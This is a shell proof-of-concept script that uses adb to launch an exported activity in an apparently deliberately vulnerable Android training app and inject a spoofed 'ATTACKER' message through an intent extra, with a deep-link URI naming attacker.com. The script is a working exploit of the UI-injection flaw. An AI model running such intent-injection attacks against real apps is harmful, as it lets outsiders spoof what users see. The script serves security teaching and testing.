# Proof-of-Concept for UnprotectedExportedActivity UI Injection

# This script demonstrates how an external application can launch the exported
# UnprotectedExportedActivity and inject arbitrary data into its UI.
# The activity retrieves the "secret_override" extra from the intent and displays it.

# Prerequisites:
# - ADB (Android Debug Bridge) must be installed and configured.
# - An Android device or emulator with the VulnerAppDLH.apk installed must be connected.
# - The target activity (UnprotectedExportedActivity) must be running or activatable.

# Usage:
# 1. Ensure your device/emulator is connected: `adb devices`
# 2. Run this script: `./exploit_unprotected_activity.sh`

# Define package and component for clarity
PACKAGE="com.dlh.vulnerapp"
ACTIVITY="com.dlh.vulnerapp.UnprotectedExportedActivity"
INJECTED_MESSAGE="[ATTACKER]: This message was injected via an unprotected component! Sensitive data could be spoofed."

echo "--- Starting PoC for UnprotectedExportedActivity ---"
echo "Target: $PACKAGE/$ACTIVITY"
echo "Injecting message: \"$INJECTED_MESSAGE\""
echo ""

# Launch the exported activity using adb shell am start
# We specify the component, the action, categories, and inject our string extra.
# The deep link URI is also included to match the activity's intent filter.
adb shell am start \
  -n "$PACKAGE/$ACTIVITY" \
  -a android.intent.action.VIEW \
  -c android.intent.category.DEFAULT \
  -c android.intent.category.BROWSABLE \
  --es secret_override "$INJECTED_MESSAGE" \
  "vulnerapp://attacker.com/inject"

echo ""
echo "--- PoC Execution Complete ---"
echo "Please observe the device/emulator screen."
echo "You should see the '$ACTIVITY' displaying the message:"
echo "'Sensitive Action Triggered by External App!' followed by the injected data."
echo "If the app was not open, it might launch it to the foreground."
